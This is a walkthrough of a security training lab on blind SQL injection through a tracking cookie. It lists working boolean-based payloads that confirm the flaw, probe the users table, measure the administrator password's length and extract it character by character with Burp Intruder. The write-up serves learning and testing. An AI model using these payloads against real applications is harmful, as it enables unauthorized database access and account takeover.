# Blind SQL injection with conditional responses
* This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
* The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
	* The database contains a different table called `users` with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
	* To solve the lab, log in as `administrator` user.
### 1. Test for blind SQL injection
* A request contains `TrackingId`. It might be used for blind SQLi
	* Test the blind SQL injection by modifying `TrackingId`. Append a true statement after the value
```sql
' AND '1'='1'
```
![35](https://user-images.githubusercontent.com/53956303/160209582-4aa6778b-1aae-4567-9e2f-3cdd260f53e3.png)
* Test the blind SQL injection by append a false statement after the value of `TrackingId`
```sql
' AND '1'='2
```
* From the result, the message "Welcome back" has been disappeared.

![36](https://user-images.githubusercontent.com/53956303/160209863-f2d36a0e-2221-45e7-a6d1-3ea4103f28e6.png)
* It means the blind SQL injection works.
### 2. Veryfy a table name "users" using blind SQL injection
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```
* As a result, the message "Welcome back" is appeared again.

![37](https://user-images.githubusercontent.com/53956303/160210136-83c3364e-8ca9-4366-99b3-7245fcfa687a.png)
### 3. Verify a username `administrator` in the `users` table
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
* The "Welcome back" message is appeared again. It mean that the `administrator` user is in `users` table.
### 4. Find the length of the password of `administartor` user using Burp Repeater
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
.
.
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```
* From 1 to 19, the string "Welcome back" is given, which menas true. Then, when enter 20 as condition, the string disappeared.
	* It means that the password is 20 character long.

![39](https://user-images.githubusercontent.com/53956303/160210993-9a10047d-9bbf-4c37-82b9-915c704d27dd.png)
### 5. Use the Burp Intruder to find the password
* Set the position at the final "a"
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
![40](https://user-images.githubusercontent.com/53956303/160211200-24172aa1-94ac-4b04-af6f-91e2932bf0d7.png)
* Set the payload of `0-9` and `a-z`

![41](https://user-images.githubusercontent.com/53956303/160211335-eabda381-6479-4b19-a840-db631b06d9dc.png)
* Set the Options (Grep-Match)
	* Clear the list and add "Welcome back!"

![42](https://user-images.githubusercontent.com/53956303/160211769-8a574476-06dd-4c66-b013-4d694e0f5b7f.png)
* Then, start the attack. Change the first number (Start poistion) in `SUBSTRING(string, start, length)` function, which extracts a single character from the password, everytime when the right character is found.
	* From the result, the first character `4` is found. do this until find the full password.

![43](https://user-images.githubusercontent.com/53956303/160211861-8f3f77e2-2a85-42a9-bd43-c91b8e7d285f.png)
* When the attack for the 20th character, the complete password `4dcsc1x02o226ubi3bg9` is given.

![45](https://user-images.githubusercontent.com/53956303/160213193-ea66a490-bb93-4967-8050-2bfdcebae6f0.png)

* With the obtained password, access to the "administrator" account is granted. The lab is solved.

![44](https://user-images.githubusercontent.com/53956303/160213133-69eb06f1-69a5-4e80-886e-d4ca9235dccb.png)
